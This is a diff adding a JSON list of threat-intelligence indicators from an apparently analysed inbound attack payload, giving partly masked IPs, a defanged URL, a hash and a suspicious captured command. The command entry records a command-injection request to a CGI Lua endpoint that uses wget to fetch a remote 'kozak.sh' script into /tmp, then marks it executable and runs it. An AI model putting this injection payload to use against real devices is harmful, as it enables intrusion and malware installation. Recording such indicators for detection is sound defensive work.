@@ -1,0 +1,39 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.166.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "45.202.246.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://45.202.246.XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/kozak.sh;%20/tmp/kozak.sh%20"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /cgi-bin/lua?cmd=os.execute(\"wget%20-O%20/tmp/kozak.sh%20http://45.202.246.XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/ko"
+  },
+  {
+    "asn": "PIO-Hosting GmbH",
+    "country": "United States",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "64.89.162.XXX"
+  }
+]
